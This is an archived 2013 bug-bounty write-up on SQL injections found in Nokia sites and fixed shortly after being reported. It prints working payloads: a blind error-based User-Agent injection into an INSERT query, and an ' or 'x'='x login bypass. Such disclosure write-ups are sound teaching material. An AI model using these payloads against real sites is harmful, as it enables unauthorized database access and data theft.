---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-07-30_sql-injections-in-nokia-sites.md
original_filename: 2013-07-30_sql-injections-in-nokia-sites.md
title: SQL injections in Nokia sites.
category: documents
detected_topics:
- xss
- sqli
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- xss
- sqli
- command-injection
- csrf
- api-security
language: en
raw_sha256: beb9bde8110b936d7f2bc1b8be8ee5eb9392e17109c3efed859057d7e7d939ee
text_sha256: 28c0f11a4f99e7be6a2e992c22842228d5485df21fc43b3e7853accfdd897bf0
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# SQL injections in Nokia sites.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-07-30_sql-injections-in-nokia-sites.md
- Source Type: markdown
- Detected Topics: xss, sqli, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `beb9bde8110b936d7f2bc1b8be8ee5eb9392e17109c3efed859057d7e7d939ee`
- Text SHA256: `28c0f11a4f99e7be6a2e992c22842228d5485df21fc43b3e7853accfdd897bf0`


## Content

---
title: "SQL injections in Nokia sites."
page_title: "Josip Franjković - archived security blog: SQL injections in Nokia sites."
url: "https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html"
final_url: "https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html"
authors: ["Josip Franjkovic (@josipfranjkovic)"]
programs: ["Nokia"]
bugs: ["SQL injection"]
publication_date: "2013-07-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6400
---

Hello,  
  
I have found out about [Nokia security reward](http://www.nokia.com/global/security/security/) program somewhere mid-April. Reports of people getting one or more mobile phones made me interested and I started searching for bugs.  
As usual XSS/CSRF did not bring people real reward (only Hall of Fame), I started looking for SQL injections (and SQL injections only).  
  
In one week I have found total of 4 SQL injections in their sites, but will write about three of them as fourth one is fairly similar to one of these three.  
  
So:  

#  SQL injection in www4.nokia.de

Found this site using Google. The actual vulnerable link was:  
http://www4.nokia.de/storelocator/  
  
Vulnerable variable is the **User-Agent header** , there was no response on page except for blank or load, so it was **blind SQL injection**.  
  
The query behind was INSERT INTO, MySQL was the database.  
So, how do you exploit something like  

> INSERT INTO table(a,b,c)VALUES(1,2,'$user_agent')

if there is **no** error reporting, and you **cannot** see output from the database?  
  
After trying to make valid PoC for 10 minutes, I did not know what to do. So, I asked one of my old friends, [Bryan de Houwer](https://twitter.com/Nurfed1). Few minutes later, he said "**Hey, did you try inserting into multiple rows?** "... I forgot that, for some reason.  
  
You could do something like  

> INSERT INTO table(a,b,c)VALUES(1,2,3),(4,5,6);

Great!  
After some brute-forcing, I found out the INSERT query had 5 columns.  
  
Setting my User-Agent to  

> ',1,1),(1,2,3,4,5)-- -

  
The site loaded, meaning the query worked.  
  
  
Now, you cannot use usual AND 3=23 in INSERT queries, as  

> INSERT INTO a(b)VALUES(1 and 3=23);

is a valid query, and it will go through - meaning I cannot get any data.  
  
**I needed some way to trigger error for true/false.**  
  
  
Now what?  
One of my favorite blind SQL injection tricks is to make the database**return multiple rows in a subquery**.  
  
For example,  

> SELECT a,(select b from table) from table;  
> 

  
will return "Subquery returns more than 1 row" - if there is more than one row, of course.  
  
  
Now, I used the UNION keyword to do the trick for me:  
  

> SELECT 1 UNION SELECT 2;  
> 

-> "Subquery returns more than 1 row";  
  
  
with a **CASE** statement, my final injection looked like:  
  
  

> User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)=**5**) then 1 else 2 end))-- -

The page loads.  
  
  

> User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)=**4**) then 1 else 2 end))-- -  
> 

  
Blank. See the change in version.  
  
Time-line:  
22\. April 2013 - Vulnerability reported.  
22\. April 2013 - Response from Nokia Team  
23\. April 2013 - Vulnerability fixed (That was pretty fast!)  
  
  
  

#  SQL injection in ***********

**URL is hidden for now, as there is still one unpatched vulnerability. As soon as it gets patched, I am publishing it.**  
Found this site using **********  
This is a PHP site from <2005\. I think this told you enough.  
  
Login using  
User: ' or 'x'='x  
Pass: 'or 'x'='x  
  
From there, pretty much every **SINGLE...** well, everything was vulnerable to SQL injection.  
The DB was PostgreSQL.  
Error reporting was on.  
Multiple queries, DROP/CREATE privileges, much like connecting to your database and sending your own queries.  
  
Time-line:  
23\. April 2013 - Reported  
23\. April 2013 - Reply from Nokia Team  
25\. April 2013 - Fixed (took them some time to find login details).  
  
Gotta love old, forgotten sites.  
  

#  Nokia.es subdomain SQL injection

Got no idea how I found this one.  
The injection is blind, time based.  
PICTURES!  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgs6-QO206ie1mZzY5ICECJ0SoiyXKACQyJQ5Wa2zAKrtNptc-XCkPzMEpMEEdjB1d-GHa7StFrDHpUbNPV8H0l_BW662BL57m12ZKH1WXFMcHVbTrYHK8S0LaB6lVIr-xrRQxprZWSgNO/s640/nokia1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgs6-QO206ie1mZzY5ICECJ0SoiyXKACQyJQ5Wa2zAKrtNptc-XCkPzMEpMEEdjB1d-GHa7StFrDHpUbNPV8H0l_BW662BL57m12ZKH1WXFMcHVbTrYHK8S0LaB6lVIr-xrRQxprZWSgNO/s1600/nokia1.jpg)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjADLAfLBQVJ1tXUuDqtXRqlYUq0VbnXLbaLUt5wPYYChyphenhyphengsxvR8_1Dx2CAoCW4-4LGMojdf3x-VpGl0FmGW9l3uxEglZtIe8TAOR8L6G_A3cWqxUyVajrgj7L0utK1p7F_S_AkRZCx9YQc/s640/nokia2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjADLAfLBQVJ1tXUuDqtXRqlYUq0VbnXLbaLUt5wPYYChyphenhyphengsxvR8_1Dx2CAoCW4-4LGMojdf3x-VpGl0FmGW9l3uxEglZtIe8TAOR8L6G_A3cWqxUyVajrgj7L0utK1p7F_S_AkRZCx9YQc/s1600/nokia2.jpg)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9l0bVZ3yaKKb32HoheyJqLFZDEs6cR0WiUz_dFNoY63O9FVDjz48N-5lG_GbyKTYjY1VTQI5a9g9PfyXxreKNtb2_O8E3SctlMB4R-Ir7wFM7zQXwHgrXQ3PV_-CFm1UBQjy9NhCdDUoS/s640/nokia3.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9l0bVZ3yaKKb32HoheyJqLFZDEs6cR0WiUz_dFNoY63O9FVDjz48N-5lG_GbyKTYjY1VTQI5a9g9PfyXxreKNtb2_O8E3SctlMB4R-Ir7wFM7zQXwHgrXQ3PV_-CFm1UBQjy9NhCdDUoS/s1600/nokia3.jpg)

  
**True:**  
**  
**  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglenZBy1sD84hm6nsFt4pbd5rkXYcEWdvsRktWivx3jTaU443eruoLXYUM3D14TAZvNSlqglRxqmoBAVkT2pNiYSzEGZon8DaoIqrHtP8uopULlkZKUnbB1TvMgFB_OXWFg6hRxL7Z1GjF/s640/nokia4.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglenZBy1sD84hm6nsFt4pbd5rkXYcEWdvsRktWivx3jTaU443eruoLXYUM3D14TAZvNSlqglRxqmoBAVkT2pNiYSzEGZon8DaoIqrHtP8uopULlkZKUnbB1TvMgFB_OXWFg6hRxL7Z1GjF/s1600/nokia4.jpg)

  
**False:**  
**  
**  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJVdmrhyphenhypheny8i1J_rviq-NeBEmKfoQPdhgXmekevXjQk8cq6KszC4Vpgg0BRfJENS-abYOd6lpoxceH1_koQg8FfEwRTX5qTEfsGk3Wfjwl7rxVXhUDc68SLOrvyaJTfuRszZpmO-k_nNyqr/s640/nokia5.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJVdmrhyphenhypheny8i1J_rviq-NeBEmKfoQPdhgXmekevXjQk8cq6KszC4Vpgg0BRfJENS-abYOd6lpoxceH1_koQg8FfEwRTX5qTEfsGk3Wfjwl7rxVXhUDc68SLOrvyaJTfuRszZpmO-k_nNyqr/s1600/nokia5.jpg)

  
  
  
  

#  Conclusion:

Fourth SQL injection is almost the same as first.  
  
Nokia fixed those bugs really fast.  
  
I was awarded a single Nokia Lumia 820 (yellow color, looks great and is an amazing phone) and the Top Reporter status for April.  
  
Although those vulnerabilities were found in short time frame, and I was not really working my ass off, **I have expected at least a Lumia 920 or another Lumia 820** \- I know of people who got multiple phones for XSS/CSRF in similar domains.  
  
I would like to thank the Nokia Incident Response Team for their quick fixes, and [Bryan de Houwer](https://twitter.com/Nurfed1) for reminding me of multiple inserts in SQL.
